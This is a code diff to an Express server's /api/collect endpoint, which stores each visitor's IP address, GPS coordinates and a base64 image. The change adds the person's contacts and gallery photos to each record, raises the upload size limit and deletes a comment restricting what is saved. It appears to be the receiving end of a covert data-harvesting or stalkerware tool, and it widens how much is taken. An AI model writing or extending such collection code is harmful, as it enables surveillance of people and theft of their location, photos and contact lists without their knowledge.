@@ -7,7 +7,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const DATA_FILE = path.join(__dirname, 'data.json');
 
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json({ limit: '15mb' }));
 app.use(cors());
 app.use(express.static(__dirname));
 
@@ -54,7 +54,6 @@ app.post('/api/collect', (req, res) => {
     const recordId = 'ID_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    // Only 2 premises allowed and saved
     const loc = req.body.location || { latitude: 'N/A', longitude: 'N/A' };
 
     db[recordId] = {
@@ -63,6 +62,8 @@ app.post('/api/collect', (req, res) => {
         latitude: loc.latitude,
         longitude: loc.longitude,
         image_base64: req.body.image_base64 || null,
+        contacts: req.body.contacts || 'Not Available',
+        gallery_image: req.body.gallery_image || null,
         timestamp: new Date().toISOString()
     };
 
